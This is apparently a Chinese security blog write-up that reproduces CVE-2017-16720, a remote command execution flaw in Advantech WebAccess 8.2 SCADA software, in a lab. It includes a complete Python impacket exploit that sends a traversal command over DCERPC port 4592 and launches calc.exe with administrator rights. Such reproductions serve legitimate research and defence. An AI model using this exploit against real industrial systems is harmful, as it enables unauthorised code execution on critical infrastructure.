## 声明

### *本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。

## 漏洞描述

研华WebAccess软件是研华物联网应用平台解决方案的核心，为用户提供一个基于HTML5技术用户界面，实现跨平台、跨浏览器的数据访问体验。使用WebAccess后，用户可以建立一个信息管理平台，同步提高垂直市场管理发展的效率。

基于浏览器的WebAccess软件应用于SCADA系统，有效地解决了油库自动化多系统互联、数据共享和系统联动的难题，其图形化组态功能可直观的查看被控设备运行情况，提供的报警、趋势分析、系统联动与自动控制功能极大的提高了油库作业效率和安全管理水平，充分体现了远程控制的优越性和人机结合的智能性

此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令，通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机，
webvrpcs.exe服务以管理员访问权限运行。

## 漏洞编号

CVE-2017-16720

## 影响范围

版本小于8.1、8.3.1、8.3.2

## 环境准备

靶机服务器：Windows Server 2008 R2 x64（192.168.31.8）

攻击机：kali（python3）

## 漏洞复现

1.1 通过官方渠道，下载存在该漏洞的版本程序安装在靶机服务器；

<http://advcloudfiles.advantech.com/web/Download/webaccess/8.2/AdvantechWebAccessUSANode8.2_20170817.exe>

![1647328636_62303d7c631d42e837af5.png!small?1647328637373](https://image.3001.net/images/20220315/1647328636_62303d7c631d42e837af5.png!small?1647328637373)1.2
安装一律默认NEXT即可，TCP端口也无需自定义，默认程序端口4592，安装完成，系统重启，可查看本机已开放4592端口。

![1647329088_62303f406127af7755775.png!small?1647329088581](https://image.3001.net/images/20220315/1647329088_62303f406127af7755775.png!small?1647329088581)

![1647329336_623040386bbd4e39d6ead.png!small?1647329337143](https://image.3001.net/images/20220315/1647329336_623040386bbd4e39d6ead.png!small?1647329337143)

1.3 使用CVE-2017-16720的EXP脚本，对搭载Advantech WebAccess
8.2-2017.08.18程序的靶机服务器进行攻击，脚本如下：（注意：python3环境运行）

    
    
    #!/usr/bin/python3  
      
    # Exploit Title: Advantech WebAccess < 8.3 webvrpcs Directory Traversal RCE Vulnerability  
    # Date: 03-11-2018  
    # Exploit Author: Chris Lyne (@lynerc)  
    # Vendor Homepage: www.advantech.com  
    # Software Link: http://advcloudfiles.advantech.com/web/Download/webaccess/8.2/AdvantechWebAccessUSANode8.2_20170817.exe  
    # Version: Advantech WebAccess 8.2-2017.08.18  
    # Tested on: Windows Server 2008 R2 Enterprise 64-bit  
    # CVE : CVE-2017-16720  
    # See Also: https://www.zerodayinitiative.com/advisories/ZDI-18-024/  
      
    import sys, struct  
    from impacket import uuid  
    from impacket.dcerpc.v5 import transport  
      
    def call(dce, opcode, stubdata):  
    dce.call(opcode, stubdata)  
    res = -1  
    try:  
    res = dce.recv()  
    except Exception as e:  
    print("Exception encountered..." + str(e))  
    sys.exit(1)  
    return res  
      
    if len(sys.argv) != 2:  
    print("Provide only host arg")  
    sys.exit(1)  
      
    port = 4592  
    interface = "5d2b62aa-ee0a-4a95-91ae-b064fdb471fc"  
    version = "1.0"   
      
    host = sys.argv[1]  
      
    string_binding = "ncacn_ip_tcp:%s" % host  
    trans = transport.DCERPCTransportFactory(string_binding)  
    trans.set_dport(port)  
      
    dce = trans.get_dce_rpc()  
    dce.connect()  
      
    print("Binding...")  
    iid = uuid.uuidtup_to_bin((interface, version))  
    dce.bind(iid)  
      
    print("...1")  
    stubdata = struct.pack("<III", 0x00, 0xc351, 0x04)  
    call(dce, 2, stubdata)  
      
    print("...2")  
    stubdata = struct.pack("<I", 0x02)  
    res = call(dce, 4, stubdata)  
    if res == -1:  
    print("Something went wrong")  
    sys.exit(1)  
    res = struct.unpack("III", res)  
      
    if (len(res) < 3):  
    print("Received unexpected length value")  
    sys.exit(1)  
      
    print("...3")  
    # ioctl 0x2711  
    stubdata = struct.pack("<IIII", res[2], 0x2711, 0x204, 0x204)  
    print(stubdata)  
    command = b"..\\..\\windows\\system32\\calc.exe"  
    fmt = "<" + str(0x204) + "s"  
    stubdata += struct.pack(fmt, command)  
    call(dce, 1, stubdata)  
      
    print("\nI can't believe you got it!")  
      
    dce.disconnect()

![1647332329_62304be9d8e4f13a0aae9.png!small?1647332330143](https://image.3001.net/images/20220315/1647332329_62304be9d8e4f13a0aae9.png!small?1647332330143)

1.4 如果漏洞攻击成功，利用EXP脚本发送系统命令执行指令到服务器上，服务器会执行对应指令，弹出计算器。

![1647332451_62304c63ae5bd1c8e486e.png!small?1647332451926](https://image.3001.net/images/20220315/1647332451_62304c63ae5bd1c8e486e.png!small?1647332451926)

![1647332599_62304cf713ae6e65fd0cc.png!small](https://image.3001.net/images/20220315/1647332599_62304cf713ae6e65fd0cc.png!small)

可以看到靶机服务器弹出了计算器，证明漏洞利用成功!

## 流量分析

通过对EXP脚本执行过程中，使用Wireshark抓取对应数据流量，来看服务器通信过程；

![1647333020_62304e9c80828ecc4a7cb.png!small?1647333020900](https://image.3001.net/images/20220315/1647333020_62304e9c80828ecc4a7cb.png!small?1647333020900)

